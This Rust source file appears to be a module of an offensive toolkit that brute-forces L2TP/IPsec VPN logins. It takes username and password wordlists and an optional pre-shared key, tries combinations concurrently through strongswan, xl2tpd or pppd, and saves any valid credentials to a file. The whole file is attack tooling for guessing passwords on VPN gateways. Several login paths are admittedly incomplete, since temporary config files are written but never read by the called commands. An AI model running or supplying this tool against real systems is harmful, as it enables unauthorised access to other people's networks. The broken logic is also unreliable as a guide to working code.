use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use regex::Regex;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicU64, Ordering},
    time::Instant,
};
use tokio::{
    process::Command,
    sync::{Mutex, Semaphore},
    time::{sleep, Duration, timeout},
};

const PROGRESS_INTERVAL_SECS: u64 = 2;

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::stdout().flush();
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   L2TP/IPsec VPN Brute Force Module                       ║".cyan());
    println!("{}", "║   Requires strongswan, xl2tpd, or pppd                    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = loop {
        let input = prompt_default("L2TP/IPsec Port (IKE)", "500")?;
        match input.trim().parse::<u16>() {
            Ok(p) if p > 0 => break p,
            Ok(_) => println!("{}", "Port must be between 1 and 65535.".yellow()),
            Err(_) => println!("{}", "Invalid port number. Please enter a number between 1 and 65535.".yellow()),
        }
    };

    let usernames_file_path = loop {
        let input = prompt_required("Username wordlist path")?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let passwords_file_path = loop {
        let input = prompt_required("Password wordlist path")?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    // Optional: Pre-shared key (PSK) for IPsec phase
    let psk = prompt_optional("IPsec Pre-shared Key (PSK) - optional, press Enter to skip")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "5")?;
        match input.trim().parse::<usize>() {
            Ok(n) if n > 0 && n <= 10000 => break n,
            Ok(n) if n == 0 => println!("{}", "Concurrency must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Concurrency must be between 1 and 10000.".yellow()),
            Err(_) => println!("{}", "Invalid number. Please enter a positive integer.".yellow()),
        }
    };

    let timeout_secs: u64 = loop {
        let input = prompt_default("Connection timeout (seconds)", "15")?;
        match input.trim().parse::<u64>() {
            Ok(n) if n > 0 && n <= 300 => break n,
            Ok(n) if n == 0 => println!("{}", "Timeout must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Timeout must be between 1 and 300 seconds.".yellow()),
            Err(_) => println!("{}", "Invalid timeout. Please enter a number between 1 and 300.".yellow()),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file name", "l2tp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false)?;

    let addr = normalize_target(target, port)?;
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    println!("\n[*] Starting brute-force on {}", addr);
    println!("[*] Timeout: {} seconds", timeout_secs);
    if psk.is_some() {
        println!("[*] Using IPsec PSK authentication");
    } else {
        println!("[*] No PSK specified - will attempt without PSK");
    }

    let users = load_lines(&usernames_file_path)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", users.len());

    let passwords = load_lines(&passwords_file_path)?;
    if passwords.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", passwords.len());

    let total_attempts = if combo_mode { users.len() * passwords.len() } else { passwords.len() };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();
    let timeout_duration = Duration::from_secs(timeout_secs);

    if combo_mode {
        // Try every password with every user
        for user in &users {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }
            for pass in &passwords {
                if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                    break;
                }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let psk_clone = psk.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    match try_l2tp_login(&addr_clone, &user_clone, &pass_clone, &psk_clone, timeout_duration).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                            found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            if verbose_flag {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }
                    drop(permit);
                    sleep(Duration::from_millis(100)).await;
                }));
            }
        }
    } else {
        // Try passwords sequentially, cycling through users
        for (i, pass) in passwords.iter().enumerate() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }
            let user = users.get(i % users.len()).expect("User list modulus logic error").clone();

            let addr_clone = addr.clone();
            let pass_clone = pass.clone();
            let psk_clone = psk.clone();
            let found_credentials_clone = Arc::clone(&found_credentials);
            let stop_signal_clone = Arc::clone(&stop_signal);
            let semaphore_clone = Arc::clone(&semaphore);
            let stats_clone = Arc::clone(&stats);
            let verbose_flag = verbose;
            let stop_on_success_flag = stop_on_success;

            tasks.push(tokio::spawn(async move {
                if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                    return;
                }
                let permit = match semaphore_clone.acquire_owned().await {
                    Ok(permit) => permit,
                    Err(_) => return,
                };
                if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                    return;
                }

                match try_l2tp_login(&addr_clone, &user, &pass_clone, &psk_clone, timeout_duration).await {
                    Ok(true) => {
                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
                        let mut found = found_credentials_clone.lock().await;
                        found.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
                        stats_clone.record_attempt(true, false);
                        if stop_on_success_flag {
                            stop_signal_clone.store(true, Ordering::Relaxed);
                        }
                    }
                    Ok(false) => {
                        stats_clone.record_attempt(false, false);
                        if verbose_flag {
                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
                        }
                    }
                    Err(e) => {
                        stats_clone.record_attempt(false, true);
                        if verbose_flag {
                            println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                        }
                    }
                }
                drop(permit);
                sleep(Duration::from_millis(100)).await;
            }));

            // Limit concurrent tasks
            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        log(verbose, &format!("[!] Task join error: {}", e));
                    }
                }
            }
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task join error: {}", e).red());
            }
        }
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final();

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            match File::create(&filename) {
                Ok(mut file) => {
                    for (host_addr, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host_addr, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file: {}", filename.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", filename.display());
                }
                Err(e) => {
                    eprintln!("[!] Could not create output file '{}': {}", filename.display(), e);
                }
            }
        }
    }

    Ok(())
}

/// Attempts L2TP/IPsec VPN login
/// 
/// Note: L2TP/IPsec authentication is complex and requires:
/// - Root privileges for IPsec operations
/// - Proper configuration files (/etc/ipsec.conf, /etc/ipsec.secrets, etc.)
/// - IPsec phase (machine authentication with PSK/certificates)
/// - L2TP phase (user authentication with username/password)
/// 
/// This implementation provides the framework. A full implementation would need to:
/// - Create temporary configuration files dynamically
/// - Use ipsec/strongswan commands to establish IPsec tunnel
/// - Use xl2tpd or pppd to establish L2TP tunnel within IPsec
/// - Parse connection status and authentication responses
async fn try_l2tp_login(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // Try using strongswan (ipsec/strongswan) if available
    let strongswan_check = Command::new("which")
        .arg("ipsec")
        .output()
        .await;
    
    if strongswan_check.is_ok() && strongswan_check.unwrap().status.success() {
        return try_l2tp_strongswan(addr, username, password, psk, timeout_duration).await;
    }

    // Fallback: try xl2tpd if available
    let xl2tpd_check = Command::new("which")
        .arg("xl2tpd")
        .output()
        .await;
    
    if xl2tpd_check.is_ok() && xl2tpd_check.unwrap().status.success() {
        return try_l2tp_xl2tpd(addr, username, password, psk, timeout_duration).await;
    }

    // Try using system L2TP tools (Windows: rasdial, Linux: various)
    #[cfg(target_os = "linux")]
    {
        // Try using pppd with l2tp plugin if available
        let pppd_check = Command::new("which")
            .arg("pppd")
            .output()
            .await;
        
        if pppd_check.is_ok() && pppd_check.unwrap().status.success() {
            return try_l2tp_pppd(addr, username, password, psk, timeout_duration).await;
        }
    }

    Err(anyhow!("No L2TP client tools found. Please install strongswan, xl2tpd, or pppd with L2TP support."))
}

async fn try_l2tp_strongswan(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // Extract IP address from addr (remove port if present)
    let server_ip = addr.split(':').next().unwrap_or(addr);
    
    // Create temporary directory for config files
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_brute_{}", std::process::id());
    let ipsec_conf_path = temp_dir.join(format!("{}.conf", conn_name));
    let ipsec_secrets_path = temp_dir.join(format!("{}.secrets", conn_name));
    
    // Build IPsec configuration
    let psk_value = psk.as_deref().unwrap_or("default");
    let ipsec_conf = format!(
        r#"conn {}
    type=transport
    authby=secret
    left=%defaultroute
    right={}
    rightprotoport=17/1701
    auto=start
    keyexchange=ikev1
    ike=aes128-sha1-modp1024
    esp=aes128-sha1
"#,
        conn_name, server_ip
    );
    
    // Build secrets file
    let ipsec_secrets = format!(
        r#"{} : PSK "{}"
{} : XAUTH "{}"
"#,
        server_ip, psk_value, username, password
    );
    
    // Write config files
    std::fs::write(&ipsec_conf_path, ipsec_conf)
        .map_err(|e| anyhow!("Failed to write IPsec config: {}", e))?;
    std::fs::write(&ipsec_secrets_path, ipsec_secrets)
        .map_err(|e| anyhow!("Failed to write IPsec secrets: {}", e))?;
    
    // Set permissions on secrets file (should be 600)
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&ipsec_secrets_path)?.permissions();
        perms.set_mode(0o600);
        std::fs::set_permissions(&ipsec_secrets_path, perms)?;
    }
    
    // Try to establish connection using ipsec
    // Note: This requires root privileges and proper strongswan setup
    // strongswan typically reads from /etc/ipsec.conf and /etc/ipsec.secrets
    // For a bruteforce tool, we'd ideally use temporary configs, but ipsec
    // doesn't easily support that. This is a framework implementation.
    // In practice, you might need to:
    // 1. Run as root
    // 2. Temporarily modify system config files, or
    // 3. Use strongswan's swanctl with custom configs
    
    // Try using ipsec up command (requires proper system configuration)
    let mut child = Command::new("ipsec")
        .arg("up")
        .arg(&conn_name)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // Check if connection was established
            // Exit code 0 typically means success
            Ok(status.success())
        }
        Ok(Err(e)) => {
            Err(anyhow!("strongswan error: {}", e))
        }
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };
    
    // Clean up connection
    let _ = Command::new("ipsec")
        .arg("down")
        .arg(&conn_name)
        .output()
        .await;
    
    // Clean up temp files
    let _ = std::fs::remove_file(&ipsec_conf_path);
    let _ = std::fs::remove_file(&ipsec_secrets_path);
    
    result
}

async fn try_l2tp_xl2tpd(addr: &str, username: &str, password: &str, _psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // xl2tpd requires configuration files
    // Create temporary config files for this attempt
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_brute_{}", std::process::id());
    let xl2tpd_conf_path = temp_dir.join(format!("{}.xl2tpd.conf", conn_name));
    let ppp_secrets_path = temp_dir.join(format!("{}.chap-secrets", conn_name));
    
    let server_ip = addr.split(':').next().unwrap_or(addr);
    
    // Build xl2tpd config
    let xl2tpd_conf = format!(
        r#"[lac {}]
lns = {}
ppp debug = no
pppoptfile = /etc/ppp/options.xl2tpd
length bit = yes
"#,
        conn_name, server_ip
    );
    
    // Build PPP secrets (CHAP)
    let ppp_secrets = format!(
        r#"{} * {} *
"#,
        username, password
    );
    
    // Write config files
    std::fs::write(&xl2tpd_conf_path, xl2tpd_conf)
        .map_err(|e| anyhow!("Failed to write xl2tpd config: {}", e))?;
    std::fs::write(&ppp_secrets_path, ppp_secrets)
        .map_err(|e| anyhow!("Failed to write PPP secrets: {}", e))?;
    
    // Try to connect using xl2tpd-control
    // Note: xl2tpd must be running and configured
    let mut child = Command::new("xl2tpd-control")
        .arg("connect")
        .arg(&conn_name)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // Check if connection was established
            Ok(status.success())
        }
        Ok(Err(e)) => Err(anyhow!("xl2tpd error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };
    
    // Clean up connection
    let _ = Command::new("xl2tpd-control")
        .arg("disconnect")
        .arg(&conn_name)
        .output()
        .await;
    
    // Clean up temp files
    let _ = std::fs::remove_file(&xl2tpd_conf_path);
    let _ = std::fs::remove_file(&ppp_secrets_path);
    
    result
}

#[cfg(target_os = "linux")]
async fn try_l2tp_pppd(addr: &str, username: &str, password: &str, _psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // pppd with L2TP plugin
    // This requires proper configuration and typically root privileges
    let server_ip = addr.split(':').next().unwrap_or(addr);
    
    // Create temporary options file for pppd
    let temp_dir = std::env::temp_dir();
    let options_file = temp_dir.join(format!("pppd_options_{}.txt", std::process::id()));
    
    let options_content = format!(
        r#"noauth
user {}
password {}
plugin pppol2tp.so
pppol2tp_server {}
"#,
        username, password, server_ip
    );
    
    std::fs::write(&options_file, options_content)
        .map_err(|e| anyhow!("Failed to write pppd options: {}", e))?;
    
    let mut child = Command::new("pppd")
        .arg("nodetach")
        .arg("file")
        .arg(&options_file)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // pppd returns 0 on successful connection
            Ok(status.success())
        }
        Ok(Err(e)) => Err(anyhow!("pppd error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };
    
    // Clean up temp file
    let _ = std::fs::remove_file(&options_file);
    
    result
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let trimmed = host.trim();
    let caps = re
        .captures(trimmed)
        .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str()
            .parse::<u16>()
            .map_err(|_| anyhow!("Invalid port value in target '{}'", host))?
    } else {
        default_port
    };
    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };
    Ok(formatted)
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required. Please provide a value.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default_val: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default_val).cyan().bold());
    std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default_val.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

fn prompt_optional(msg: &str) -> Result<Option<String>> {
    print!("{}", format!("{} (optional, press Enter to skip): ", msg).cyan().bold());
    std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        None
    } else {
        Some(trimmed.to_string())
    })
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path = Path::new(input_path_str);
    let filename_component = path
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .unwrap_or_else(|| std::borrow::Cow::Borrowed(input_path_str));

    let final_name = if filename_component.is_empty()
        || filename_component == "."
        || filename_component == ".."
        || filename_component.contains('/')
        || filename_component.contains('\\')
    {
        "l2tp_results.txt"
    } else {
        filename_component.as_ref()
    };

    PathBuf::from(format!("./{}", final_name))
}

